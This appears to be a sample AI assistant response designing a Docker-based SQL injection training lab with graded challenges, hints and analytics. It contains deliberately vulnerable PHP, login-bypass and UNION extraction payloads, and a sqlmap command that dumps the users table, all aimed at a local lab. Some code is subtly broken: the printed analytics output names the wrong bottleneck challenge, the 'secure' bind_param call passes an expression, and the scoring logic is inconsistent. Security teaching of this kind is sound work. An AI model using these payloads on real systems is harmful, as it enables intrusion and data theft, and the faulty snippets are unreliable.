# Example: Lab Exercise Design (SQL Injection Lab)

## User Request

```
Спроектируй hands-on lab для обучения SQL injection с автоматической проверкой выполнения.
```

## Reasoning

**Domain:** Education (Lab design, hands-on exercises)
**Complexity:** Medium
**Model:** Sonnet

## Response

---

# Lab Design Framework

```
┌─────────────────────────────────────────────────────────────────────────┐
│  EFFECTIVE LAB STRUCTURE                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│  1. SCENARIO → Real-world context (not abstract exercise)               │
│  2. OBJECTIVES → What student will learn/accomplish                      │
│  3. PREREQUISITES → Required knowledge check                             │
│  4. ENVIRONMENT → Pre-configured vulnerable system                       │
│  5. CHALLENGES → Progressive difficulty (easy → medium → hard)           │
│  6. HINTS → Gradual disclosure (not full solution)                       │
│  7. VALIDATION → Automated checks (flag submission)                      │
│  8. SOLUTION → Detailed walkthrough (unlocks after completion)           │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Example Lab: "BookStore SQL Injection"

### 1. Scenario (Real-World Context)

```markdown
# Lab: BookStore Database Breach

You've been hired by BookStore Inc. to audit their new online store.
The CTO claims "We sanitize all inputs - no SQL injection possible!"

Your mission: Prove them wrong by exploiting the search functionality.

**Target:** http://bookstore.lab.local
**Goal:** Extract the admin password from the database
**Flag format:** FLAG{admin_password_here}
```

**Why Scenario Matters:**
- Boring: "Practice SQL injection on this form"
- Engaging: "You're a security consultant hired to prove CTO wrong"

---

### 2. Learning Objectives (SMART Goals)

```markdown
## What You'll Learn

By completing this lab, you will be able to:

✅ Identify SQL injection vulnerabilities in web applications
✅ Exploit authentication bypass using SQLi
✅ Extract data from databases using UNION-based attacks
✅ Use sqlmap to automate SQL injection exploitation
✅ Write a penetration test finding for SQLi vulnerability

**Estimated Time:** 45-60 minutes
**Difficulty:** Beginner → Intermediate
**Tools:** Burp Suite, sqlmap, browser
```

---

### 3. Prerequisites (Knowledge Check)

```markdown
## Prerequisites Quiz

Before starting this lab, ensure you understand:

1. What is SQL? (Answer: Structured Query Language for databases)
2. What does this query do?
   `SELECT * FROM users WHERE username='admin'`
3. What is the purpose of the single quote (') in SQL?

**Pass Threshold:** 3/3 correct

If you answered incorrectly, review:
- [SQL Basics Tutorial](link)
- [Web Application Fundamentals](link)
```

---

### 4. Environment Setup (Docker Compose)

```yaml
# docker-compose.yml - Vulnerable web app + database
version: '3'
services:
  bookstore:
    build: ./bookstore-app
    ports:
      - "8080:80"
    environment:
      - DB_HOST=db
      - DB_USER=bookstore_user
      - DB_PASS=insecure_password
    depends_on:
      - db

  db:
    image: mysql:5.7
    environment:
      - MYSQL_ROOT_PASSWORD=root
      - MYSQL_DATABASE=bookstore
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
```

```sql
-- init.sql - Database initialization
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50),
    password VARCHAR(100),
    role VARCHAR(20)
);

INSERT INTO users VALUES
    (1, 'admin', 'FLAG{5up3r_53cr3t_p4ssw0rd}', 'admin'),
    (2, 'user1', 'password123', 'user'),
    (3, 'user2', 'letmein', 'user');

CREATE TABLE books (
    id INT PRIMARY KEY AUTO_INCREMENT,
    title VARCHAR(100),
    author VARCHAR(100),
    price DECIMAL(10,2)
);

INSERT INTO books VALUES
    (1, 'The Art of SQL Injection', 'Alice Hacker', 29.99),
    (2, 'Web Security 101', 'Bob Smith', 39.99),
    (3, 'Penetration Testing Guide', 'Carol Wilson', 49.99);
```

```php
// bookstore-app/search.php - VULNERABLE CODE (intentionally)
<?php
$search = $_GET['search'];  // NO SANITIZATION!

// Vulnerable query (concatenation)
$query = "SELECT * FROM books WHERE title LIKE '%$search%'";

$result = mysqli_query($conn, $query);

if ($result) {
    while ($row = mysqli_fetch_assoc($result)) {
        echo "<div>{$row['title']} by {$row['author']}</div>";
    }
} else {
    echo "Database error: " . mysqli_error($conn);  // ERROR LEAKAGE!
}
?>
```

**One-Command Setup:**
```bash
docker-compose up -d
# Access lab at: http://localhost:8080
```

---

### 5. Lab Challenges (Progressive Difficulty)

#### Challenge 1: Detection (10 points)

```markdown
## Task 1: Identify the Vulnerability

Try searching for: `test'`

**Question:** What error message do you see?

**Expected:** "Database error: You have an error in your SQL syntax..."

**Deliverable:** Screenshot of error message

**Hint 1 (unlocks after 5 min):** Try adding a single quote after your search term
**Hint 2 (unlocks after 10 min):** Look at the error message - what does "syntax" suggest?
```

**Automated Validation:**
```python
# validate_challenge1.py
def check_detection(screenshot_path):
    """Check if student captured SQL error."""
    import pytesseract
    from PIL import Image

    img = Image.open(screenshot_path)
    text = pytesseract.image_to_string(img)

    if "syntax error" in text.lower():
        return {"points": 10, "feedback": "✅ Correct! SQL injection detected."}
    else:
        return {"points": 0, "feedback": "❌ Incorrect. Try adding ' to your search."}
```

---

#### Challenge 2: Authentication Bypass (20 points)

```markdown
## Task 2: Bypass Login

The login form is at: http://localhost:8080/login.php

**Goal:** Login as `admin` without knowing the password

**Vulnerable Query (hint):**
SELECT * FROM users WHERE username='$user' AND password='$pass'

**Deliverable:** Submit the payload you used

**Hint 1 (unlocks after 5 min):** What if you closed the username string early?
**Hint 2 (unlocks after 10 min):** Try: admin' OR '1'='1
**Hint 3 (unlocks after 15 min):** Use `--` to comment out the rest of the query
```

**Automated Validation:**
```python
# validate_challenge2.py
def check_auth_bypass(payload):
    """Validate authentication bypass payload."""
    import requests

    url = "http://localhost:8080/login.php"
    data = {"username": payload, "password": "x"}

    response = requests.post(url, data=data)

    if "Welcome, admin" in response.text:
        return {"points": 20, "feedback": "✅ Correct! You bypassed authentication."}
    else:
        return {"points": 0, "feedback": "❌ Try again. Hint: Use OR logic."}

# Example test
print(check_auth_bypass("admin' OR '1'='1"))
# Output: {'points': 20, 'feedback': '✅ Correct! ...'}
```

---

#### Challenge 3: Data Extraction (30 points)

```markdown
## Task 3: Extract Admin Password

Now that you know there's SQLi in the search form, extract the admin password.

**Steps:**
1. Determine number of columns (UNION attack)
2. Find which columns display on page
3. Extract from `users` table

**Goal:** Submit the admin password (format: FLAG{...})

**Deliverable:** The flag
```

**Payloads to Try:**
```sql
-- Step 1: Find number of columns
test' UNION SELECT NULL--           # Error (1 column)
test' UNION SELECT NULL,NULL--      # Error (2 columns)
test' UNION SELECT NULL,NULL,NULL-- # Success! (3 columns)

-- Step 2: Find displayable columns
test' UNION SELECT 'A','B','C'--    # 'A' and 'B' display on page

-- Step 3: Extract password
test' UNION SELECT username,password,NULL FROM users WHERE role='admin'--
```

**Automated Validation:**
```python
# validate_challenge3.py
def check_flag(submitted_flag):
    """Validate flag submission."""
    correct_flag = "FLAG{5up3r_53cr3t_p4ssw0rd}"

    if submitted_flag == correct_flag:
        return {
            "points": 30,
            "feedback": "🎉 Correct! You extracted the admin password using UNION-based SQLi."
        }
    else:
        return {
            "points": 0,
            "feedback": "❌ Incorrect flag. Hint: Use UNION SELECT to query users table."
        }
```

---

#### Challenge 4: Automated Exploitation (20 points)

```markdown
## Task 4: Automate with sqlmap

Use sqlmap to automate the data extraction.

**Goal:** Dump the entire `users` table

**Command Template:**
sqlmap -u "http://localhost:8080/search.php?search=test" --dump -T users

**Deliverable:** Paste the sqlmap output showing all users
```

**Automated Validation:**
```python
# validate_challenge4.py
def check_sqlmap_output(output_text):
    """Validate sqlmap dump contains all users."""
    required_usernames = ['admin', 'user1', 'user2']

    found = [user for user in required_usernames if user in output_text]

    if len(found) == 3:
        return {"points": 20, "feedback": "✅ Correct! sqlmap successfully dumped users table."}
    else:
        return {"points": 0, "feedback": f"❌ Missing users: {set(required_usernames) - set(found)}"}
```

---

#### Challenge 5: Write Pentest Finding (20 points)

```markdown
## Task 5: Document Your Finding

Write a professional penetration test finding for this vulnerability.

**Template:**

### Finding: SQL Injection in Search Functionality

**Severity:** Critical
**CVSS Score:** 9.8 (Critical)

#### Description:
[Explain what SQL injection is and where you found it]

#### Proof of Concept:
[Show the payload that worked]

#### Impact:
[What can an attacker do? Extract data? Modify database? Delete records?]

#### Remediation:
[How should developers fix this?]

**Deliverable:** Submit your finding in Markdown format
```

**Automated Validation:**
```python
# validate_challenge5.py
def check_pentest_finding(finding_text):
    """Validate pentest finding quality."""
    score = 0
    feedback = []

    # Check required sections
    required_sections = ['Description', 'Proof of Concept', 'Impact', 'Remediation']

    for section in required_sections:
        if section.lower() in finding_text.lower():
            score += 5
        else:
            feedback.append(f"❌ Missing section: {section}")

    # Check for specific remediation advice
    good_remediations = ['parameterized', 'prepared statements', 'ORM']

    if any(rem in finding_text.lower() for rem in good_remediations):
        score += 10
        feedback.append("✅ Good remediation advice")
    else:
        feedback.append("⚠️  Remediation is vague - mention prepared statements")

    # Check for severity justification
    if 'critical' in finding_text.lower() or 'cvss' in finding_text.lower():
        score += 5
        feedback.append("✅ Severity justified")

    if score >= 15:
        return {"points": 20, "feedback": "\n".join(feedback)}
    else:
        return {"points": score, "feedback": "\n".join(feedback)}
```

---

### 6. Hints System (Gradual Disclosure)

```python
# hints_system.py - Time-delayed hint system
import time

class HintSystem:
    def __init__(self, challenge_id):
        self.challenge_id = challenge_id
        self.start_time = time.time()
        self.hints = {
            "challenge1": [
                (300, "Hint 1: Try adding a single quote (') after your search term"),
                (600, "Hint 2: Look at the error message - what SQL keyword appears?"),
                (900, "Hint 3: The error reveals the query structure. Can you break it?")
            ],
            "challenge2": [
                (300, "Hint 1: What if you closed the username string early with '?"),
                (600, "Hint 2: Try: admin' OR '1'='1"),
                (900, "Hint 3: Use -- to comment out the password check")
            ]
        }

    def get_available_hints(self):
        """Return hints based on elapsed time."""
        elapsed = time.time() - self.start_time
        available = []

        for delay, hint in self.hints.get(self.challenge_id, []):
            if elapsed >= delay:
                available.append(hint)

        return available

# Usage
hints = HintSystem("challenge1")
time.sleep(310)  # Wait 5+ minutes
print(hints.get_available_hints())
# Output: ['Hint 1: Try adding a single quote ...']
```

---

### 7. Solution Walkthrough (Unlocks After Completion)

```markdown
# Solution: BookStore SQL Injection

## Challenge 1: Detection

The search form concatenates user input directly into SQL:

\`\`\`php
$query = "SELECT * FROM books WHERE title LIKE '%$search%'";
\`\`\`

Testing with `test'` breaks the query:
```
SELECT * FROM books WHERE title LIKE '%test'%'
                                         ↑ Syntax error
```

## Challenge 2: Authentication Bypass

Payload: `admin' OR '1'='1`

Resulting query:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='x'
                                    ↑ Always true
```

## Challenge 3: Data Extraction

Step 1: Find columns
```sql
test' UNION SELECT NULL,NULL,NULL--  # 3 columns
```

Step 2: Extract password
```sql
test' UNION SELECT username,password,NULL FROM users WHERE role='admin'--
```

Result: `FLAG{5up3r_53cr3t_p4ssw0rd}`

## Challenge 4: sqlmap Automation

```bash
sqlmap -u "http://localhost:8080/search.php?search=test" \
       --dump -T users --batch
```

## Challenge 5: Remediation

**Vulnerable Code:**
```php
$query = "SELECT * FROM books WHERE title LIKE '%$search%'";
```

**Secure Code:**
```php
$stmt = $conn->prepare("SELECT * FROM books WHERE title LIKE ?");
$stmt->bind_param("s", "%$search%");
$stmt->execute();
```

---

## Lab Analytics Dashboard

```python
# lab_analytics.py - Track student performance
from datetime import datetime

class LabAnalytics:
    def __init__(self, lab_id):
        self.lab_id = lab_id
        self.students = []

    def add_student(self, student_id, challenges_completed, total_points, time_spent):
        self.students.append({
            'student_id': student_id,
            'challenges': challenges_completed,
            'points': total_points,
            'time': time_spent
        })

    def completion_rate(self):
        """% of students who completed all challenges."""
        completed = len([s for s in self.students if s['challenges'] == 5])
        return (completed / len(self.students)) * 100 if self.students else 0

    def average_time(self):
        """Average time to complete (minutes)."""
        if not self.students:
            return 0
        total = sum(s['time'] for s in self.students)
        return total / len(self.students)

    def difficulty_analysis(self):
        """Identify hardest challenge (where students get stuck)."""
        challenge_completion = {i: 0 for i in range(1, 6)}

        for student in self.students:
            for i in range(1, student['challenges'] + 1):
                challenge_completion[i] += 1

        completion_rates = {
            c: (count / len(self.students)) * 100
            for c, count in challenge_completion.items()
        }

        print("Challenge Completion Rates:")
        for challenge, rate in completion_rates.items():
            print(f"  Challenge {challenge}: {rate:.0f}%")

        # Find bottleneck
        bottleneck = min(completion_rates, key=completion_rates.get)
        print(f"\n⚠️  Bottleneck: Challenge {bottleneck} ({completion_rates[bottleneck]:.0f}%)")

# Example usage
analytics = LabAnalytics("sqli_lab")

analytics.add_student("student1", 5, 100, 45)  # Completed all, 100 points, 45 min
analytics.add_student("student2", 3, 60, 30)   # Got stuck on Challenge 4
analytics.add_student("student3", 5, 95, 50)   # Completed all
analytics.add_student("student4", 2, 30, 20)   # Got stuck on Challenge 3

print(f"Completion Rate: {analytics.completion_rate():.0f}%")
print(f"Average Time: {analytics.average_time():.0f} min")
analytics.difficulty_analysis()

# Output:
# Completion Rate: 50%
# Average Time: 36 min
# Challenge Completion Rates:
#   Challenge 1: 100%
#   Challenge 2: 100%
#   Challenge 3: 75%   ← Bottleneck
#   Challenge 4: 50%
#   Challenge 5: 50%
#
# ⚠️  Bottleneck: Challenge 3 (75%)
# → Action: Add more hints for UNION-based SQLi
```

---

## Lab Design Best Practices

| Principle | Why Important | Implementation |
|-----------|---------------|----------------|
| **Progressive Difficulty** | Build confidence, prevent frustration | Easy → Medium → Hard challenges |
| **Automated Validation** | Instant feedback, scales to 100+ students | Python scripts check submissions |
| **Hints, Not Solutions** | Encourage problem-solving | Time-delayed hints (5, 10, 15 min) |
| **Real-World Scenario** | Engagement, context | "You're hired to audit..." |
| **Measurable Objectives** | Clear success criteria | "Extract admin password" (not "learn SQLi") |
| **Time Estimates** | Set expectations | "45-60 minutes" |
| **Docker Environment** | Reproducible, isolated | One-command setup |

---

## Key Takeaways

1. **Scenario-based** — Real-world context > abstract exercise
2. **Progressive difficulty** — Start easy, build to hard
3. **Automated validation** — Instant feedback at scale
4. **Hints system** — Guide, don't give away (time-delayed)
5. **Analytics** — Track bottlenecks, improve lab over time

**Lab Design Formula:**
```
Engaging Scenario + Clear Objectives + Automated Checks + Gradual Hints = Effective Lab
```

**Time Investment:**
- Design: 4-6 hours
- Build environment: 2-3 hours
- Testing: 2 hours (run lab yourself + 2 beta testers)
- Iteration: Update based on analytics every 3 months

**Tools:** Docker, Python, pytest, Canvas LMS, GitHub
